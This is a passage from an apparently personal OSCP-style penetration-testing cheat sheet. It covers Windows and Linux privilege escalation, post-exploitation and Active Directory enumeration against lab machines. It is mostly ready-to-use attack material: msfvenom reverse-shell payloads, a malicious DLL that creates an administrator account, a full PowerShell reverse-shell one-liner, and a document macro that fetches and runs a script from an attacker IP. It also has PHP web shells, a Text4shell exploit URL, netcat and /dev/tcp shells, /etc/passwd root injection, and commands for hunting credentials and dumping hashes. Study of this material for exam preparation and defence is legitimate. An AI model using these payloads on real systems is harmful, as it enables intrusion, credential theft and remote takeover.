(Get-PSReadlineOption).HistorySavePath #displays the path of consoleHost_history.txt
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

#Viewing installed execuatbles
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#Process Information
Get-Process
Get-Process | Select ProcessName,Path

#Sensitive info in XAMPP Directory
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue #this for a specific user

#Service Information
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
#change the service as you like GPGOrchestrator
Get-WmiObject -Class Win32_Service -Filter "Name='GPGOrchestrator'" | Select-Object StartName
schtasks /query /fo LIST /v
#Service With shortcuts and filters to name service run in schedulers
schtasks.exe /query /fo LIST /v^C
schtasks.exe /query /fo LIST /v | findstr TaskName
#Create windows service using sc in winprep machine
sc.exe create "NAMEofSERVICE" binpath= "PATH"
#Like Below
sc.exe create "Scheduler" binpath= "C:\Users\offsec\Desktop\Scheduler.exe"
#Check in procmon64.exe found in Sysinternal tools
#Procmon > Filter Option > Filter > Process Name , is , Scheduler.exe >Add > Apply > Ok
# In Procmon windows you will identify the (Operation : CreateFile, Path:same name.dll), based on  that create file) usint this code (https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#dll-hijacking-adding-new-user-into-administrators-group)
Restart-Service Scheduler  #(Name of the service or name file or file.exe)
```

## Automated Scripts

```bash
winpeas.exe
winpeas.bat
Jaws-enum.ps1
powerup.ps1
PrivescCheck.ps1
```

## Token Impersonation

- Command to check `whoami /priv`

```powershell
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"

#RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999

#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a

#SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
#writes whoami command to w.log file
```

## Services


-💡 <b>GPGOrchestrator</b>(Genomedics srl - GPG Orchestrator)["C:\Program Files\MilleGPG5\GPGService.exe"] - Auto - Running
- YOU CAN MODIFY THIS SERVICE: AllAccess
- File Permissions: Users [WriteData/CreateFiles]
- Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [WriteData/CreateFiles])
- Created msfvenom payload using this script [Github](https://github.com/lof1sec/mobile_mouse_rce/blob/main/mobile_mouse_rce.py)

```powershell
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=<KaliIP> LPORT=<Listening Port> -f exe -o shell.exe
# Check the above information why I used GPGOrchestrator to start GPGService.exe, First i replaced the GPGService.exe with msfvenom payload.
Restart-Service 'GPGOrchestrator'
sc start 
```
### Binary Hijacking
- I had a situation where I ran winPEASx64.exe and identified some services running with full privileges.
- But the replaced the service netcat listener on my Kali machine but still, Listerner did not catch it.


```powershell
#Finding the right service
Get-WmiObject -Class Win32_Service -Filter "Name='GPGService'"
# And you can find the all the services
Get-WmiObject -Class Win32_Service

#Identify service from winpeas
icalcs "path" #F means full permission, we need to check we have full access on folder
sc qc <servicename> #find binarypath variable
sc config <service> <option>="<value>" #change the path to the reverseshell location
sc start <servicename>
Restart-Service <servicename>
```

### Unquoted Service Path

```bash
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
#Check the Writable path
icalcs "path"
#Insert the payload in writable location and which works.
sc start <servicename>
```

### Insecure Service Executables

```bash
#In Winpeas look for a service which has the following
File Permissions: Everyone [AllAccess]
#Replace the executable in the service folder and start the service
sc start <service>
```

### Weak Registry permissions

```bash
#Look for the following in Winpeas services info output
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have ful access

accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS

#Service Information from regedit, identify the variable which holds the executable
reg query <reg-path>

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
#Imagepath is the variable here

net start <service>
```

## DLL Hijacking

1. Find Missing DLLs using Process Monitor, Identify a specific service which looks suspicious and add a filter.
2. Check whether you have write permissions in the directory associated with the service.
```bash
# Create a reverse-shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
```
3. Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
4. Start listener and restart service, you'll get a shell.

### DLL Hijacking adding New user into Administrators group
1. Create DLL with name file.cpp
2. Convert file to .cpp to .dll, executable DLL using "x86_64-w64-mingw32-gcc".
3. Place DLL on the target, with same name as missing (My case - BetaService)
4. restart or start the service
5. Check net user command, new user will be added.
   

```bash
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user ashok password123! /add");
  	    i = system ("net localgroup administrators ashok /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc file.cpp --shared -o file.dll
```


## Autorun

```powershell
#For checking, it will display some information with file-location
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

#Check the location is writable
accesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS

#Replace the executable with the reverseshell and we need to wait till Admin logins, then we'll have shell
```

## AlwaysInstallElevated

```powershell
#For checking, it should return 1 or Ox1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

#Creating a reverseshell in msi format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi > reverse.msi

#Execute and get shell
msiexec /quiet /qn /i reverse.msi
```

## Windows - Kernel Exploits wes, windows-exploit-suggester.py
- In Windows kernel exploit first you need to copy the system info into txt file, we have 2 types of scripts
- windows-exploit-suggester.py, Windows Exploit Suggester - Next Generation (WES-NG)or wes [walkthrough wes authby pgpractice](https://www.youtube.com/watch?v=U-VLgIDlySA&t=11s)
- If one exploit is not working always revert the machine

```powershell
# Python Virtual Environment is running on my KaliLinux at <b>/home/kali/HTB/HTB/Chaos</b>
source /home/kali/HTB/HTB/Chaos/myenv/bin/activate # To start directly or you can create a new one virtual environment.

#windows-exploit-suggester.py
python2 windows-exploit-suggester.py --database 2024-10-28-mssb.xls --systeminfo /home/kali/HTB/PGPractice/AuthBy/Systeminfo

#wes
wes --help
wes --update 
wes /home/kali/HTB/PGPractice/AuthBy/Systeminfo -e
wes /home/kali/HTB/PGPractice/AuthBy/Systeminfo -e -i "Elevation of Privilege" # It will give "Elevation of Privilege" instead of this string search Imapact parameter

# 32 bit compile
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32 # It will generate file MS11-046.exe
MS11-046.exe # Run in Windows command line, got administrator access
```

## Schedules Tasks

```bash
schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
#Permission check - Writable means exploitable!
icalcs "path"
#Wait till the scheduled task in executed, then we'll get a shell
```

## Startup Apps

```bash
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applications can be found here
#Check writable permissions and transfer
#The only catch here is the system needs to be restarted
```

## Insecure GUI apps

```bash
#Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
#Open that particular application, using "open" feature enter the following
file://c:/windows/system32/cmd.exe 
```

## SAM and SYSTEM

- Check in following folders

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

C:\windows.old

#First go to c:
dir /s SAM
dir /s SYSTEM
```

- Obtaining Hashes from SYSTEM and SAM
```bash
reg save hklm\sam c:\sam
reg save hklm\system c:\system
```
### impacket-secretsdump SAM SYSTEM ntds.dit
-Cracking the hashes using impacket-secretsdump using system either SAM or ntds.dit
- If the hash seems to be like “31d6cfe0d16ae931b73c59d7e0c089c0” it means may be disabled accounts https://www.vanimpe.eu/2019/03/07/mimikatz-and-hashcat-in-practice/
```bash
impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
impacket-secretsdump -ntds ntds.dit -system SYSTEM local 
#Now a detailed list of hashes are displayed
```

## Passwords

### Sensitive files

```bash
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
Findstr /si password *.config 
findstr /si pass/pwd *.ini  

dir /s *pass* == *cred* == *vnc* == *.config*  

in all files  
findstr /spin "password" *.*  
findstr /spin "password" *.*
```

### Config files

```bash
c:\sysprep.inf  
c:\sysprep\sysprep.xml  
c:\unattend.xml  
%WINDIR%\Panther\Unattend\Unattended.xml  
%WINDIR%\Panther\Unattended.xml  

dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s *pass*  

dir c:\*vnc.ini /s /b  
dir c:\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini
```

### Registry

```bash
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

#Putty keys
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there

### VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"  

### Windows autologin  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  

### SNMP Paramters  
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  

### Putty  
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  

### Search for password in registry  
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s
```

### RunAs - Savedcreds

```bash
cmdkey /list #Displays stored credentials, looks for any optential users
#Transfer the reverseshell
runas /savecred /user:admin C:\Temp\reverse.exe
```

### Pass the Hash

```bash
#If hashes are obtained though some means then use psexec, smbexec and obtain the shell as different user.
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
```
### mRemoteNG - Windows PrivEsc
- mRemoteNG is an open-source remote connections manager that allows users to view and manage multiple remote connections in a single place.
- Check for Windows Program Files (x86), If any folder with mRomoteNG [Github](https://github.com/haseebT/mRemoteNG-Decrypt)
- If want see the hidden directories in Windows C:\Users\L4mpje> dir /a
- Reference HTB Bastion IPPSEC video
  
```powershell
C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml
#All the passwords will save here, to decrypt use the above GitHub link to decrypt.
python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
```
### Squid http proxy 4.14- Windows PrivEsc
- Squid is a caching and forwarding HTTP web proxy.
- Access [spose](https://github.com/aancw/spose) from Hacktricks.
- Locations of xampp wamp here xammp(C:\\xampp\\htdocs\\backdoor.php), wamp(C:\\wamp\\www\\backdoor.php)

```powershell
# Both are target IP's squid from the PG Practice. It give the credentials or open ports, then turn on the froxy proxy the access the ports
python3 spose/spose.py --proxy http://192.168.205.189:3128 --target 192.168.205.189
# Found port 8080 phpmyadmin create database then executed shell
<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\backdoor.php"
```
### SeManageVolumeExploit.exe(SeChangeNotifyPrivilege Bypass traverse checking) WinPrivEsc
- If you have SeChangeNotifyPrivilege Bypass traverse checking in whoami /priv then try this, override the Printconfig.dll
- This Scenario user svc_mssql have permission
- S1ren's Access PG Pracess privileges escalation 

```powershell
.\SeManageVolumeExploit.exe # this change the entires nearly 917 or something
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.214 LPORT=4444 -f dll -o Printconfig.dll
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\   # CLick yes to overwrite
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")  # start you listener nc -nlvp 4444
$object = [Activator]::CreateInstance($type)
rlwrap nc -lvnp 4444 # GOT shell
```

---

# Linux Privilege Escalation

- [Privesc through TAR wildcard](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)

## Linux Privilege Escalation -TCM Security
- Resources [gotmilk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) , [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) , [HackTricks-Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) , [Sushant747-Linux](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
- Links
```bash
# Connecting ssh older version (Unable to negotiate with 10.10.98.115 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss, Bad key types 'ssh-dss)
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa TCM@10.10.231.100

```

## TTY Shell

```powershell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

## Basic

```bash
find / -writable -type d 2>/dev/null # Writable permission
find /etc -type f -writable 2> /dev/null # writable permission in /etc
find / -type d -perm -o+w -print  # Another Writable permission but it checks other's with writable permission
dpkg -l #Installed applications on debian system
cat /etc/fstab #Listing mounted drives
lsblk #Listing all available drives
lsmod #Listing loaded drivers

watch -n 1 "ps -aux | grep pass" #Checking processes for credentials
sudo tcpdump -i lo -A | grep "pass" #Password sniffing using tcpdump

```
## Manual Enumeration
```bash
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/os-release
uname -a
cd /home
groups <USER> 
id -G <USER>

ps aux
ip a or ifconfig
routel or route
ss -anp or netstat -anp
cat /etc/iptables/rules.v4
ls -lah /etc/cron*
crontab -l
sudo crontab -l
dpkg -l or rpm
find / -writable -type d 2>/dev/null
cat /etc/fstab 
mount
lsblk
lsmod
>/sbin/modinfo liata (# libata found in the above command)
find / -perm -u=s -type f 2>/dev/null
strings file_read(Read file)
which bash sh awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp git 2>/dev/null
```
## Searchsploit Exploit Finder
- Finding right exploit
```bash
cat /etc/issue
# Ubuntu 16.04.4 LTS \n \l
uname -r 
# 4.4.0-116-generic
arch 
# x86_64
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
## Wheel Linux FreeBSD
- A group of users with similar permissions to the root user, but without using root user credentials.
- Read the doas config file commands slightly different commapred to the regular Linux command
- Wheel group is similar to the root privileges

```bash
locate doas
#/usr/local/bin/doas search for where the doas file existed
/usr/local/bin/doas pw usermod andrew -G wheel
```

## Automated Scripts

```bash
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
./unix-privesc-check > output.txt
Mestaploit: multi/recon/local_exploit_suggester
```

## Sensitive Information

```bash
cat .bashrc
env #checking environment variables
watch -n 1 "ps -aux | grep pass" #Harvesting active processes for credentials
#Process related information can also be obtained from PSPY
```

## Sudo/SUID/Capabilities

[GTFOBins](https://gtfobins.github.io/)


```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## Cron Jobs

```bash
#Detecting Cronjobs
cat /etc/crontab
crontab -l

pspy #handy tool to livemonitor stuff happening in Linux
./pspy64 #it will extract the live process with some credentials if it has
Ctrl+z #Stop process

grep "CRON" /var/log/syslog #inspecting cron logs
```
## NC Netcat
```bash
nc -nlvp <port> 
nc <attacker-ip> <port> -e /bin/bash
```
## NFS

```bash
##Mountable shares
cat /etc/exports #On target
showmount -e <target IP> #On attacker
###Check for "no_root_squash" in the output of shares

mount -o rw <targetIP>:<share-location> <directory path we created>
#Now create a binary there
chmod +x <binary>
```
## Writable /etc/passwd file
```bash
>ls -l /etc/passwd
-rw-rw-rw- 1 root root 1370 Apr 12 16:44 /etc/passwd (#Write permission)
>openssl passwd ashok
DLYJ9ZDE6uY5o
>echo "ashok:DLYJ9ZDE6uY5o:0:0:root:/root:/bin/bash" >> /etc/passwd
>su ashok(#password is also ashok, switch directory to ashok get the flag)
```

## rbash
-Some times linux shell is restricted if have ssh shell and credentials
```bash
ssh <user>@<ip> -t "bash --noprofile"
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## Scripts to sudo -l
_ If some scripts have have the sudo permission
```bash
#(ALL) NOPASSWD: /../../../../../../home/user/.cgi_bin/bin /tmp/*
#creating bin file in the user
nano bin
#!/bin/bash
chmod u+s /bin/bash
---END of FILE
#Run his command woth sudo
sudo /../../../../../../home/user/.cgi_bin/bin /tmp/*
ll /bin/bash 
# if Stickiy bit is set
/bin/bash -p
id #if euid is set 0
#then root
whoami
```

## Linux Shells and Apache Commons Text 1.8 (Text4shell), CVE-2022–42889
- In nmap result has port 8080 http-proxy is open, using gobuster identifed /search, /CHANGELOG.
- In /CHANGELOG shown "Added Apache Commons Text 1.8" leads to this link [Medium](https://medium.com/mii-cybersec/cve-2022-42889-text4shell-vulnerability-17b703a48dcd)
- The traditional msfvenom payload is not working here worked [Discord](https://discord.com/channels/780824470113615893/1087927556604432424/1255218982634651793)
- For reference OSCP B Berlin .150 the discord link.
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f elf > linux1234.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f sh > linux1234.sh
# These shells are downloaded from the python server but no shell, The IP Address kali IP Address

# After Searching in the Medium link and Discord found this way to create shell
echo "bash -i >& /dev/tcp/192.168.45.220/443 0>&1" > shell
# In Browser
http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27wget%20192.168.45.220%2Fshell%20-O%20%2Ftmp%2Fshell%27)%7D
http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27bash%20%2Ftmp%2Fshell%27)%7D
rlwrap nc -nlvp 443
#Got shell
```

## Exploiting Kernel Vulnerabilities
```bash
cat /etc/issue (Ubuntu 16.04.4 LTS \n \l)
uname -a Linux ubuntu-privesc 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux arch (X86_64)
kali>searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
kali>cp /usr/share/exploitdb/exploits/linux/local/45010.c .
kali>head 45010.c -n 20
kali>mv 45010.c cve-2017-16995.c
kali>scp cve-2017-16995.c joe@192.168.123.216: (Transfer target machine)
>gcc cve-2017-16995.c -o cve-2017-16995
>file cve-2017-16995
>./cve-2017-16995(Got root shell)
```
## CVE - Linux
CVE-2021-3156 with sudo version, Sudo version 1.8.31 (OSCP - Relia) <a href="https://github.com/ashok5141/OSCP/blob/main/Linux/exploit_nss.py">MyGit</a></br> 
https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
```bash
##I tried this "CVE-2021-3156" one, generated some data, finally land on same user anita my sudo version - Sudo version 1.8.31
https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
>./exploit_nss.py (#Got roo shell)

```
## borg backup exploit
- BorgBackup  (short:  Borg)  is a deduplicating backup program.  Optionally, it supports compression and authenticated encryption.
- The main goal of Borg is to provide an  efficient  and  secure  way  to backup data.  The data deduplication technique used makes Borg suitable for daily backups since only changes are stored.  The authenticated encryption  technique  makes it suitable for backups to not fully trusted targets.
- Borg stores a set of files in an archive. A repository is a  collection of archives. The format of repositories is Borg-specific. Borg does not distinguish archives from each other in any way other than their  name, it  does not matter when or where archives were created (e.g. different hosts).
```bash
borg init --encryption=repokey /path/to/repo
#Backup the ~/src and ~/Documents directories into an archive called Monday
borg create /path/to/repo::Monday ~/src ~/Documents
borg list /path/to/repo # List all archives
borg list /path/to/repo::Monday   # List all contents in the Monday archives
 sudo /usr/bin/borg extract --stdout borgbackup::Monday # Read the data from the Monday 
borg extract /path/to/repo::Monday #Restore the Monday archive by extracting the files relative  to  the current directory
borg delete /path/to/repo::Monday # Recover disk space by manually deleting the Monday archive
#Offsec Challenge Lab Relia 19 - https://www.ddosi.org/oscp-cheat-sheet-2/
```

## Linux Wildcard Exploit tar zip
- In the crontab running the tar as root access (grep "CRON" /var/log/syslog)
- Exploit using suid for /bin/bash, [reference](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c) OSCPC 157, 
  
```bash
grep "CRON" /var/log/syslog
#Oct 14 02:16:01 oscp CRON[3716]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
cd /opt/admin
echo "/bin/chmod 4755 /bin/bash" > shell.sh 
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
./shell.sh
#/bin/chmod: changing permissions of '/bin/bash': Operation not permitted
#Based on grep "CRON" /var/log/syslog has some file tar -zxf /tmp/backup.tar.gz *
tar cf /tmp/backup.tar.gz *
#/bin/chmod: changing permissions of '/bin/bash': Operation not permitted
tar cf backup.tar.gz *
ls -l
#-rw-r--r-- 1 cassie cassie     1 Oct 14 03:18 '--checkpoint-action=exec=sh shell.sh'
#-rw-r--r-- 1 cassie cassie     1 Oct 14 03:18 '--checkpoint=1'
#-rw-r--r-- 1 cassie cassie 10240 Oct 14 03:48  backup.tar.gz
#-rwxr-xr-x 1 cassie cassie    26 Oct 14 03:17  shell.sh
ls -la /bin/bash
#-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
/bin/bash -p
#uid=1000(cassie) gid=1000(cassie) euid=0(root) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
whoami
#Got root shell

```


---
# Post Exploitation

> This is more windows specific as exam specific.
> 

<aside>
💡 Run WinPEAS.exe - This may give us some more detailed information as no we’re a privileged user and we can open several files, gives some edge!

</aside>

## Sensitive Information

### Powershell one liner, macro exploit
- Here is the Powershell tcp one-liner [github](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
- In application accepting only .odt(LibreOffice) file, in that we are adding the macro that get shell code from kali download into local windows then run script get shell back to kali.
- Craft, Craft2 machines from PG Practice walkthrough
```powershell
# In libreoffice -> Tools -> Macros -> Organize Macros -> Basic (Below code in macro, below code is offsec.ps1 )
Sub Main
	Shell("cmd /c powershell iwr http://192.168.45.214/offsec.ps1 -o C:/Windows/Tasks/offsec.ps1")
	Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
End Sub
```
- code of offsec.ps1
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.214',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
- In this C:\xmapp uploaded the cmd.php
- To get Administrator Access with above powershell script
```powershell
#cmd.php in kali
cat cmd.php   
<pre>
<?php
system($_GET['cmd']);
?>
</pre>
# Get admin access
http://192.168.104.169/cmd.php?cmd=C:\xampp\htdocs\PrintSpoofer64.exe -c "cmd /c powershell -c C:\Windows\Tasks\offsec.ps1"
```
### RunasCs switch user with creds windows escalation privileged write
- User has file upload access .odt extension, created .odt extension with [badodt](https://github.com/rmdavy/badodf/tree/master) to get hash with responder.
- I have user credentials want to move vertically with [RunasCS](https://github.com/antonioCoco/RunasCs) and nc.exe with credentials mov
- Clone https://github.com/sailay1996/WerTrigger
- Copy phoneinfo.dll to C:\Windows\System32\
- Place Report.wer file and WerTrigger.exe in a same directory.
- Then, run WerTrigger.exe.
- Enjoy a shell as NT AUTHORITY\SYSTEM

```powershell
# Upload file generated from badodt script
sudo responder -I tun0 # Got the cybergeek creds, got shell apache user
.\RunasCs.exe thecybergeek winniethepooh "C:\temp\nc.exe 192.168.45.227 4444 -e cmd.exe" -t 0
rlwrap nc -nlvp 4444 # user is thecybergeek

#PrivEsc user xampp running with root privileges [WerTrigger](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#exploit_1)
.\agent.exe -connect 192.168.45.227:11601 -ignore-cert
# port forward get access web phpmyadmin, then access the files
select LOAD_FILE("C:/Users/Administrator/Desktop/proof.txt") INTO DUMPFILE 'C:/temp/proof.txt'; # able to read the proof.txt no get interactive access.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=4444 -f dll -o phoneinfo.dll
select LOAD_FILE("/temp/phoneinfo.dll") INTO DUMPFILE 'C:/Windows/System32/phoneinfo.dll'; # Place Report.wer file and WerTrigger.exe in a same directory.
#So mysql have root access using that copied into windows/system32
.\WerTrigger.exe # Got admin access
```

### Powershell run command
- Run the PowerShell command
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.12/jaws-enum.ps1')
```
  

### Powershell History
- I had a situation where in window AD, I got administrator access, but nothing to move forward to another machine, Then comes to the PowerShell history

```powershell
#Path
C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine
#Then do ls or dir check any files, sometimes instead of the administrator user put the current user, If it's their history you'll get ConsoleHost_history.txt
type ConsoleHost_history.txt

#History path
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

#Example
type C:\<USER>\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
```

### Searching for passwords

```powershell
dir .s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

### Searching in Registry for Passwords

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

<aside>
💡 Always check documents folders, i may contain some juicy files

</aside>

### KDBX Files

```powershell
#These are KeyPassX password stored files
cmd> dir /s /b *.kdbx 
Ps> Get-ChildItem -Recurse -Filter *.kdbx

#Cracking
keepass2john Database.kdbx > keepasshash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
```

## Dumping Hashes

1. Use Mimikatz
2. If this is a domain joined machine, run BloodHound.

## SeRestorePrivilege Escalation windows
- If you have the privilege to SeRestorePrivilege example Heist from PG Practive
- Enable [scrit](https://raw.githubusercontent.com/gtworek/PSBits/refs/heads/master/Misc/EnableSeRestorePrivilege.ps1), move utilman into .bak then move the cmd.exe to utilman.exe
- Another way is xct executable file this box not working on Heist [video](https://www.youtube.com/watch?v=1nRzABu6eKU) here the ran script with powershell oneliner got shell.
-After doing that shell will be <b>shorter time</b>.

```powershell
. .\EnableSeRestorePrivilege.ps1
Enable-SeRestorePrivilege
whoami /all # End you can see that USER CLAIMS Information User claims unknow
move utilman.exe utilman.exe.bak
move cmd.exe utilman.exe
rdesktop heist.offsec # after open windows machine press WINDOWS+U it will open the cmd prompt got shell. remember shell will shorter time
```
---

# Active Directory Pentesting

<aside>
💡 We perform the following stuff once we’re in AD network

</aside>

## Enumeration
- Enumeration using the tools identifing users and groups using tools like smbclient, smbmap, rpcclient, enum4linux, seatbelt
- If the user has privileges DnsAdmin similar machine in HacktheBox Resolute [Resolute](https://app.hackthebox.com/machines/220/information)
```powershell
smbclient -L 10.10.10.169 
smbclient -L //10.10.10.169/
smbclient -N -L //10.10.10.125/   
smbmap -H 10.10.10.169
nbtscan 10.10.10.169
nmblookup -A 10.10.10.169
rpcclient -U "" -N 10.10.10.169
rpcclient $> netshareenum
rpcclient $> netshareenumall
rpcclient $> guest
command not found: guest
